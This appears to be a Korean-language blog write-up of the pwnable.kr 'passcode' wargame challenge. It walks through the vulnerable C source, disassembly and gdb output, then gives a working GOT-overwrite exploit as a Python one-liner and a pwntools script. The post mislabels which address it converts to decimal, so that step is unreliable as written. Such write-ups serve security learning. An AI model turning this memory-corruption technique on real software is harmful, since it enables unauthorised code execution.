---
layout: post
title: Pwnable | [pwnable.kr] Passcode
subtitle: Passcode 문제 풀이
categories: Pwnable
tags: [Pwnable, malloc, pwnable.kr, Pentest]
---

**본 문제는 pwnable.kr를 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://pwnable.kr/play.php">pwnable.kr</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/180955601-66377126-dabb-43b8-8b0e-2c569e2cadac.png" width = 400>
</p>

엄마가 로그인 시스템 기반 패스코드를 만들었다고 말해줬대요.

분명 컴파일할 때는 에러가 없었는데, 경고는 있었다네요. 무슨 문제 일지 SSH를 통해 들어가서 확인해보겠습니다!

## 문제 풀이

```C
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}
```

* password1, 2를 338150과 13371337로 입력하면 바로 풀리는 건가 싶다 !

```C
void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}
```

* name의 크기를 100byte로 잡고, 총 100글자를 입력 받는다니 name의 글자 수 오버플로우로 공격은 아닌거 같다.

```C
int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

`if(passcode1==338150 && passcode2==13371337)` 이렇다는데 값을 그대로 입력해본다!

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/180956830-eabac3d1-3642-486e-986d-3973d29e7b57.png" width = 350>
</p>

* 그대로 입력 했는데 passcode2로 넘어가지지 않았다. 코드를 다시 보고 오겠습니다.

```C
printf("enter passcode1 : ");
scanf("%d", passcode1);
fflush(stdin);

printf("enter passcode2 : ");
scanf("%d", passcode2);
```

* int passcode1, 2라면 `scanf`할 때 해당 주소에 입력 값을 받는 것이므로 **&**가 반드시 필요하다. 또한, 초기화를 하지 않아 더미 값이 들어가 있을 것이다.

* 예를 들어, **&**가 있었다면 passcode1의 주소가 '0xcafebabe'면 '0xcafebabe'가 가리키는 메모리 주소에 값이 들어가게 된다. 즉, 변수에 값을 저장 하는 것이다.

* **&**가 없다는 것은 passcode1의 주소 '0xcafebabe' 자체가 변경 되게 된다. **그래서 passcode1과 passcode2에 원하는 주소 값을 넣을 수 있게 된다.**

**Welcome disassemble**
```armasm
0x08048609 <+0>:     push   ebp
0x0804860a <+1>:     mov    ebp,esp
0x0804860c <+3>:     sub    esp,0x88
0x08048612 <+9>:     mov    eax,gs:0x14
0x08048618 <+15>:    mov    DWORD PTR [ebp-0xc],eax
0x0804861b <+18>:    xor    eax,eax
0x0804861d <+20>:    mov    eax,0x80487cb
0x08048622 <+25>:    mov    DWORD PTR [esp],eax
0x08048625 <+28>:    call   0x8048420 <printf@plt>
0x0804862a <+33>:    mov    eax,0x80487dd
0x0804862f <+38>:    lea    edx,[ebp-0x70]
0x08048632 <+41>:    mov    DWORD PTR [esp+0x4],edx
0x08048636 <+45>:    mov    DWORD PTR [esp],eax
0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
0x0804863e <+53>:    mov    eax,0x80487e3
0x08048643 <+58>:    lea    edx,[ebp-0x70]
0x08048646 <+61>:    mov    DWORD PTR [esp+0x4],edx
0x0804864a <+65>:    mov    DWORD PTR [esp],eax
0x0804864d <+68>:    call   0x8048420 <printf@plt>
0x08048652 <+73>:    mov    eax,DWORD PTR [ebp-0xc]
0x08048655 <+76>:    xor    eax,DWORD PTR gs:0x14
0x0804865c <+83>:    je     0x8048663 <welcome+90>
0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
0x08048663 <+90>:    leave
0x08048664 <+91>:    ret
```

* `<welcome+3>`에서 총 136byte의 버퍼를 생성하고, `<welcome+38>`에서 112byte의 크기를 지정하고 scanf 하는 것으로 보니 name[100]의 버퍼는 총 112byte로 할당해준 것으로 예상된다.

**Welcome login**
```armasm
0x08048564 <+0>:     push   ebp
0x08048565 <+1>:     mov    ebp,esp
0x08048567 <+3>:     sub    esp,0x28
0x0804856a <+6>:     mov    eax,0x8048770
0x0804856f <+11>:    mov    DWORD PTR [esp],eax
0x08048572 <+14>:    call   0x8048420 <printf@plt>
0x08048577 <+19>:    mov    eax,0x8048783
0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
0x08048583 <+31>:    mov    DWORD PTR [esp],eax
0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
0x0804858b <+39>:    mov    eax,ds:0x804a02c
0x08048590 <+44>:    mov    DWORD PTR [esp],eax
0x08048593 <+47>:    call   0x8048430 <fflush@plt>
0x08048598 <+52>:    mov    eax,0x8048786
0x0804859d <+57>:    mov    DWORD PTR [esp],eax
0x080485a0 <+60>:    call   0x8048420 <printf@plt>
0x080485a5 <+65>:    mov    eax,0x8048783
0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
0x080485c0 <+92>:    call   0x8048450 <puts@plt>
0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
0x080485cc <+104>:   jne    0x80485f1 <login+141>
0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
0x080485d5 <+113>:   jne    0x80485f1 <login+141>
0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
0x080485de <+122>:   call   0x8048450 <puts@plt>
0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
0x080485ea <+134>:   call   0x8048460 <system@plt>
0x080485ef <+139>:   leave
0x080485f0 <+140>:   ret
0x080485f1 <+141>:   mov    DWORD PTR [esp],0x80487bd
0x080485f8 <+148>:   call   0x8048450 <puts@plt>
0x080485fd <+153>:   mov    DWORD PTR [esp],0x0
0x08048604 <+160>:   call   0x8048480 <exit@plt>
```

* `<login+3>`에서 총 40byte의 버퍼를 생성하고, `<login+24>`에서 passcode1를 `ebp-0x10`에 할당하고 `<login+70>`에서 passcode2를 `ebp-0xc`에 할당한다.

* 그렇다면 `name[100]`는 ebp-0x70, passcode1는 ebp-0x10이다. 이 사이의 공간은 총 96byte이므로 name의 마지막 4byte로 passcode1를 덮어 씌울 수 있다는 것이다.

```
r <<< `python -c 'print("A"*96+"B"*4)'`
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/180968458-e7ab3847-8924-45a6-9956-b09d34d2b4be.png" width = 580>
</p>

* 'A' 96개, 'B' 4개를 넣었을 때 `name[100]`에 잘 들어가 있는 것을 확인 할 수 있다. `name[96]부터 name[99]`까지는 'B'가 들어가 있다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/180968773-309d4c6d-0e7e-4ea9-bd60-6e539d39f9b8.png" width = 580>
</p>

* 분명 passcode1 `scanf` 전인데 이미 'BBBB'가 들어가 있는 것을 알 수 있다. 이것을 이용하여 **system("/bin/cat flag)**를 호출 하면 될 것 같다.

* 위를 응용해 `scanf("%d", passcode1);`에서 passcode1를 **fflush의 GOT 주소**를 **system("/bin/cat flag)**의 시작주소로 변경하면 해결!

```armasm
(gdb) disassemble login
    0x08048593 <+47>:    call   0x8048430 <fflush@plt>
(gdb) x/3i 0x8048430
   0x8048430 <fflush@plt>:      jmp    DWORD PTR ds:0x804a004
   0x8048436 <fflush@plt+6>:    push   0x8
   0x804843b <fflush@plt+11>:   jmp    0x8048410
```

> `0x804a004`가 fflush의 GOT 주소

```armasm
(gdb) disassemble login
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave
   0x080485f0 <+140>:   ret
```

> `0x080485e3`가 system 실행 주소

* 하지만, `scanf("%d", passcode1);`에서 10진수로 받으므로, **0x080485ea**를 10진수로 바꾸면 **134514147**이다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/180972349-513f4bbb-278f-4125-847e-7baf5b1dc6c7.png" width = 280>
</p>

```
(python -c 'print "\x90"*96 + "\x04\xa0\x04\x08" + "134514147"'; cat) | ./passcode
```

```Python
from pwn import *
p = ssh("passcode","pwnable.kr",2222,"guest")
path = "/home/passcode/passcode"
msg = "\x90"*96 + "\x04\xa0\x04\x08" + "134514147"
payload = [path]
s = p.run(payload)
s.sendline(msg)
s.interactive()
```

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/180976163-dbef0b72-527d-42dd-bc9b-79394f621795.png" width = 520>
</p>


드디어 Flag를 찾았습니다. 많이 어렵네요:(

